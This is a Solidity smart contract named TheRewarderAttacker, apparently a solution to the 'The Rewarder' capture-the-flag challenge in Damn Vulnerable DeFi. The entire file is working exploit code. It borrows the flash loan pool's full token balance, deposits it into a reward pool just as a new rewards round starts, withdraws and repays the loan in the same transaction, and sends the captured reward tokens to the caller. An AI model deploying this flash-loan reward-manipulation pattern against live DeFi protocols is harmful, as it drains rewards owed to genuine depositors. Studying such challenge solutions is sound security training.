//SPDX-License-Identifier: UNLICENSE

pragma solidity ^0.8.0;

interface ITheRewarderPool {
    function deposit(uint256 amountToDeposit) external;
    function withdraw(uint256 amountToWithdraw) external;
    function liquidityToken() external view returns(address);
    function rewardToken() external view returns(address);
    function distributeRewards() external returns (uint256);
    function isNewRewardsRound() external view returns (bool);
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
    function liquidityToken() external view returns(address);
}

interface IERC20 {
    function transfer(address,uint256) external returns(bool);
    function balanceOf(address) external view returns(uint256);
    function approve(address,uint256) external returns(bool);
}

contract TheRewarderAttacker {

    address immutable owner;
    ITheRewarderPool immutable rewarderPool;
    IFlashLoanerPool immutable flashLoanPool;
    IERC20 immutable dvt;
    IERC20 immutable rewardToken;

    constructor(address _rewarderPool, address _flashLoanPool) {
        owner = msg.sender;
        rewarderPool = ITheRewarderPool(_rewarderPool);
        dvt = IERC20(ITheRewarderPool(_rewarderPool).liquidityToken());
        rewardToken = IERC20(ITheRewarderPool(_rewarderPool).rewardToken());
        flashLoanPool = IFlashLoanerPool(_flashLoanPool);
    }

    function attack() external {
        assert(rewarderPool.isNewRewardsRound());
        uint256 maxAmount = dvt.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(maxAmount);
        rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
    }

    function receiveFlashLoan(uint256 flashLoanAmount) external {
        dvt.approve(address(rewarderPool), flashLoanAmount);
        rewarderPool.deposit(flashLoanAmount);
        rewarderPool.withdraw(flashLoanAmount);
        dvt.transfer(address(flashLoanPool), flashLoanAmount);
    }
}